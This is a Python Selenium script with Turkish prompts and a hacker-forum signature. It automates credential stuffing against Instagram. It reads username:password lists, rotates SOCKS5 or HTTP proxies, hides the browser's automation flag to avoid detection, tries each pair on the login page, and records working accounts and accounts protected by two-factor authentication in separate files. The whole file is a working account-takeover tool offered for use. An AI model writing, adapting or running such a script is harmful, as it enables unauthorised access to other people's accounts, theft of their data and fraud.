from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from colorama import Fore, init

init(autoreset=True)

prefix = "┌──(chleoz@spyhackerz.org)-[]\n└─$ ⚡︎ "

while True:
    proxy_type = input(f"{prefix}Proxy türünü seçin (socks5 / http / proxysiz): ").strip().lower()
    if proxy_type in ["socks5", "http", "proxysiz"]:
        break
    print(f"{prefix}{Fore.RED}Hatalı giriş! Lütfen 'socks5', 'http' veya 'proxysiz' yazın.")

proxy_file = None
if proxy_type == "socks5":
    proxy_file = "socks5.txt"
elif proxy_type == "http":
    proxy_file = "http.txt"

def get_proxies(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            proxies = [line.strip() for line in file.readlines() if line.strip()]
            return proxies
    except Exception as e:
        print(f"{prefix}{Fore.RED}Hata: {e}")
        return []

proxies = get_proxies(proxy_file) if proxy_file else []

def get_credentials(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            lines = file.readlines()
            credentials = [line.strip().split(":") for line in lines if ":" in line]
            return credentials
    except Exception as e:
        print(f"{prefix}{Fore.RED}Hata: {e}")
        return []

def save_success(username, password):
    with open("passed.txt", "a", encoding="utf-8") as file:
        file.write(f"username: {username} şifre: {password}\n")

def save_2fa(username, password):
    with open("2fa.txt", "a", encoding="utf-8") as file:
        file.write(f"username: {username} şifre: {password}\n")

file_path = "chleoz.txt"
CREDENTIALS = get_credentials(file_path)

if not CREDENTIALS:
    print(f"{prefix}{Fore.RED}Kullanıcı adı veya şifre alınamadı. Dosya formatını kontrol edin.")
    exit()

if proxy_type == "proxysiz":
    proxies = [None]

for proxy in proxies:
    if proxy:
        print(f"{prefix}{Fore.CYAN}Proxy kullanılıyor: {proxy}")
    else:
        print(f"{prefix}{Fore.YELLOW}Proxy kullanılmıyor (doğrudan bağlantı).")

    options = webdriver.ChromeOptions()
    options.add_argument("--disable-gpu") 
    options.add_argument("--start-maximized")  
    options.add_argument("--disable-blink-features=AutomationControlled") 
    if proxy:
        options.add_argument(f'--proxy-server={proxy_type}://{proxy}') 

    service = Service("/usr/local/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=options)

    driver.get("https://www.instagram.com/accounts/login/")

    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="loginForm"]/div[1]/div[1]/div/label/input')))
    except:
        print(f"{prefix}{Fore.RED}Giriş sayfası yüklenirken hata oluştu. Proxy engellenmiş olabilir.")
        driver.quit()
        continue  

    for USERNAME, PASSWORD in CREDENTIALS:
        print(f"{prefix}{Fore.YELLOW}Deneme yapılıyor: {USERNAME}")

        username_input = driver.find_element(By.XPATH, '//*[@id="loginForm"]/div[1]/div[1]/div/label/input')
        password_input = driver.find_element(By.XPATH, '//*[@id="loginForm"]/div[1]/div[2]/div/label/input')

        username_input.clear()
        password_input.clear()
        username_input.send_keys(USERNAME)
        password_input.send_keys(PASSWORD)
        time.sleep(2)

        login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
        login_button.click()

        time.sleep(10)

        if "https://www.instagram.com/accounts/login/two_factor" in driver.current_url:
            print(f"{prefix}{Fore.BLUE}2FA Aktif! 🔐 username: {USERNAME} şifre: {PASSWORD}")
            save_2fa(USERNAME, PASSWORD)  
        else:
            driver.get("https://www.instagram.com/direct/inbox/")
            time.sleep(5)

            if driver.current_url == "https://www.instagram.com/direct/inbox/":
                print(f"{prefix}{Fore.GREEN}Başarıyla giriş yapıldı! ⎷ username: {USERNAME} şifre: {PASSWORD}")
                save_success(USERNAME, PASSWORD) 
            else:
                print(f"{prefix}{Fore.RED}Giriş başarısız! ✗ username: {USERNAME} şifre: {PASSWORD}")
        driver.get("https://www.instagram.com/accounts/login/")
        time.sleep(5)
    driver.quit()
